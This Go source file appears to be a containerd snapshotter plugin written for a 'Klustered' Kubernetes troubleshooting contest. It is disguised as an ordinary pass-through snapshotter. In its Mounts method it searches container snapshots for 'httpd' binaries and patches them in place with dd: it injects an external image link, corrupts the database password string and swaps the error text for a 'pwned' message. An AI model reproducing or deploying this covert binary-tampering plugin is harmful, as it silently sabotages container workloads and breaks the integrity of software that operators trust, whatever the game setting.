package main

import (
	"context"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"google.golang.org/grpc"

	snapshotsapi "github.com/containerd/containerd/api/services/snapshots/v1"
	"github.com/containerd/containerd/contrib/snapshotservice"
	"github.com/containerd/containerd/mount"
	"github.com/containerd/containerd/snapshots"
	"github.com/containerd/containerd/snapshots/native"
	"github.com/sirupsen/logrus"
	"sigs.k8s.io/release-utils/command"
)

const (
	iFrameBit = "<iframe src=\"https://giphy.com/embed/11tTNkNy1SdXGg"
	evilPatch = `<img src="https://bit.ly/3JScAMB" style="transform: rotate(180deg)"      `
	message   = `<strong>pwned by Da West Chainguard Massif`
	dbError   = `Failed to connect to database`
)

func main() {
	// args are self, socket filesystem
	if len(os.Args) < 3 {
		fmt.Printf("invalid args: usage: %s <unix addr> <root>\n", os.Args[0])
		os.Exit(1)
	}

	if err := os.RemoveAll(os.Args[1]); err != nil {
		os.Exit(1)
	}

	rpc := grpc.NewServer()
	snapper := NewSnapper(os.Args[2])
	// Create the snappshotter from the snapper
	service := snapshotservice.FromSnapshotter(snapper)
	snapshotsapi.RegisterSnapshotsServer(rpc, service)

	l, err := net.Listen("unix", os.Args[1])
	if err != nil {
		fmt.Printf("error: %v\n", err)
		os.Exit(1)
	}
	if err := rpc.Serve(l); err != nil {
		fmt.Printf("error: %v\n", err)
		os.Exit(1)
	}
}

type Snapper struct {
	snapshots.Snapshotter
	Directory string
	Upstream  snapshotsapi.SnapshotsServer
}

func NewSnapper(snapshotDir string) *Snapper {
	snapper := &Snapper{
		Directory: snapshotDir,
	}
	sn, err := native.NewSnapshotter(os.Args[2])
	if err != nil {
		fmt.Printf("error: %v\n", err)
		os.Exit(1)
	}

	snapper.Snapshotter = sn
	return snapper
}

func (*Snapper) Log(msg ...string) {
	if os.Getenv("LOGME") != "" {
		logrus.Info(msg)
	}
}

func (snapper *Snapper) Stat(ctx context.Context, key string) (snapshots.Info, error) {
	snapper.Log("Stat!")
	i, err := snapper.Snapshotter.Stat(ctx, key)
	return i, err
}

func (snapper *Snapper) Update(ctx context.Context, info snapshots.Info, fieldpaths ...string) (snapshots.Info, error) {
	snapper.Log("Update!")
	return snapper.Snapshotter.Update(ctx, info, fieldpaths...)
}
func (snapper *Snapper) Usage(ctx context.Context, key string) (snapshots.Usage, error) {
	snapper.Log("Usage!")
	return snapper.Snapshotter.Usage(ctx, key)
}
func (snapper *Snapper) Mounts(ctx context.Context, key string) ([]mount.Mount, error) {
	snapper.Log("Mounts!")
	binaries, err := locateBinaries(snapper.Directory, "httpd")
	if err != nil {
		snapper.Log("error locating binaries:", err.Error())
	}
	for _, p := range binaries {
		snapper.Log("Checking binary: " + p)
		offset, err := snapper.findStringOffset("Klustered", p)
		if err != nil {
			snapper.Log(err.Error())
		}
		if offset > 0 {
			snapper.Log("Found contest binary >>>>>>>>> %s", p)
			offset, err := snapper.findStringOffset(iFrameBit, p)
			if err != nil {
				snapper.Log(err.Error())
			}
			if offset < 0 {
				snapper.Log("  [ALREADY PATCHED 😇]")
				continue
			}

			if err := snapper.patchBinary(p, offset, evilPatch); err != nil {
				snapper.Log("Error patching: %s", err.Error())
				continue
			}

			offset, err = snapper.findStringOffset("postgresql123", p)
			if err != nil {
				snapper.Log(err.Error())
				continue
			}

			if err := snapper.patchBinary(p, offset, "postgresqll23"); err != nil {
				snapper.Log("Error patching sql connection: %s", err.Error())
			}

			offset, err = snapper.findStringOffset(dbError, p)
			if err != nil {
				snapper.Log(err.Error())
				continue
			}

			if err := snapper.patchBinary(p, offset, message); err != nil {
				snapper.Log("Error patching db error: %s", err.Error())
			}
		}
	}

	return snapper.Snapshotter.Mounts(ctx, key)
}
func (snapper *Snapper) Prepare(ctx context.Context, key, parent string, opts ...snapshots.Opt) ([]mount.Mount, error) {
	snapper.Log("Prepare!")
	return snapper.Snapshotter.Prepare(ctx, key, parent, opts...)
}
func (snapper *Snapper) View(ctx context.Context, key, parent string, opts ...snapshots.Opt) ([]mount.Mount, error) {
	snapper.Log("View!")
	return snapper.Snapshotter.View(ctx, key, parent, opts...)
}
func (snapper *Snapper) Commit(ctx context.Context, name, key string, opts ...snapshots.Opt) error {
	snapper.Log("Commit!")
	return snapper.Snapshotter.Commit(ctx, name, key, opts...)
}
func (snapper *Snapper) Remove(ctx context.Context, key string) error {
	snapper.Log("Remove!")
	return snapper.Snapshotter.Remove(ctx, key)
}
func (snapper *Snapper) Walk(ctx context.Context, fn snapshots.WalkFunc, filters ...string) error {
	snapper.Log("Walk!")
	return snapper.Snapshotter.Walk(ctx, fn, filters...)

}
func (snapper *Snapper) Close() error {
	snapper.Log("Close!")
	return snapper.Snapshotter.Close()
}

func locateBinaries(topPath, name string) (paths []string, err error) {
	paths = []string{}
	if err := filepath.Walk(topPath,
		func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}
			if info.IsDir() {
				return nil
			}
			if info.Name() == name {
				paths = append(paths, path)
			}
			return nil
		}); err != nil {
		return nil, err
	}
	return paths, nil
}

// Patches a binary at the specified byte point
func (snapper *Snapper) patchBinary(path string, offset int64, replacement string) error {
	snapper.Log("Patching %s to do evil things 👿 ", path)
	f, err := os.CreateTemp("", "")
	if err != nil {
		return err
	}
	defer os.Remove(f.Name())
	if err := os.WriteFile(
		f.Name(), []byte(replacement+"\000"), os.FileMode(0o644),
	); err != nil {
		return err
	}
	if err := command.New(
		"dd", fmt.Sprintf("if=%s", f.Name()), fmt.Sprintf("of=%s", path),
		"obs=1", fmt.Sprintf("seek=%d", offset), "conv=notrunc",
	).RunSilentSuccess(); err != nil {
		return err
	}
	return nil
}

func (snapper *Snapper) findStringOffset(pattern, path string) (bytePoint int64, err error) {
	output, err := command.New(
		"grep", "-o", "--text", "--byte-offset", pattern, path,
	).RunSilentSuccessOutput()
	if err != nil {
		return -1, nil
	}

	partes := strings.SplitN(output.OutputTrimNL(), ":", 2)
	if len(partes) < 2 {
		return -1, nil
	}

	intVal, err := strconv.Atoi(partes[0])
	if err != nil {
		return 0, fmt.Errorf("at int conversion: %w", err)
	}
	return int64(intVal), nil
}
